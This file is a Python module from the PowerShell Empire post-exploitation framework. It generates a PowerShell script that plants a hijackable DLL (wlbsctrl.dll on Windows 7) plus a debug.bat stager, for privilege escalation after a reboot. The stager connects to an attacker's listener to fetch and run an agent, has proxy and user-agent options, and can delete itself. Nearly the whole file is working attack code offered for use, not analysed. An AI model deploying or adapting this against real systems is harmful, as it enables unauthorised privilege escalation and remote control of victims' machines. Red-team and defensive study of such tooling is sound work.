from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Write-DllHijacker',

            'Author': ['leechristensen (@tifkin_)', '@harmj0y'],

            'Description': ("Writes out a hijackable .dll to the specified path "
                            "along with a stager.bat that's called by the .dll. "
                            "wlbsctrl.dll works well for Windows 7. "
                            "The machine will need to be restarted for the privesc to work."),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : False,
            
            'MinPSVersion' : '2',
            
            'Comments': [
                'https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'HijackPath' : {
                'Description'   :   "The output path for the hijackable .dll.",
                'Required'      :   True,
                'Value'         :   ''
            },
            'Delete' : {
                'Description'   :   "Switch. Have the launcher.bat delete itself after running.",
                'Required'      :   False,
                'Value'         :   'True'
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            } 
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/powerup/Write-HijackDll.ps1"

        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode


        hijackPath = self.options['HijackPath']['Value']
        batPath = "\\".join(hijackPath.split("\\")[0:-1]) + "\debug.bat"

        # generate the .bat launcher code to write out to the specified location
        l = self.mainMenu.stagers.stagers['launcher_bat']
        l.options['Listener']['Value'] = self.options['Listener']['Value']
        l.options['UserAgent']['Value'] = self.options['UserAgent']['Value']
        l.options['Proxy']['Value'] = self.options['Proxy']['Value']
        l.options['ProxyCreds']['Value'] = self.options['ProxyCreds']['Value']
        if self.options['Delete']['Value'].lower() == "true":
            l.options['Delete']['Value'] = "True"
        else:
            l.options['Delete']['Value'] = "False"
        launcherCode = l.generate()

        # PowerShell code to write the launcher out
        script += "\n$batCode = @\"\n" + launcherCode + "\"@\n"
        script += "$batCode | Out-File -Encoding ASCII '"+batPath+"';\n"
        script += "\"Launcher bat written to " + batPath + "`n\";\n"
  
        if launcherCode == "":
            print helpers.color("[!] Error in launcher .bat generation.")
            return ""
        else:
            # script += "Write-HijackDll -HijackPath '"+hijackPath+"';"
            script += "Write-HijackDll -OutputFile '"+str(hijackPath)+"' -BatPath '"+str(batPath)+"';"
            return script
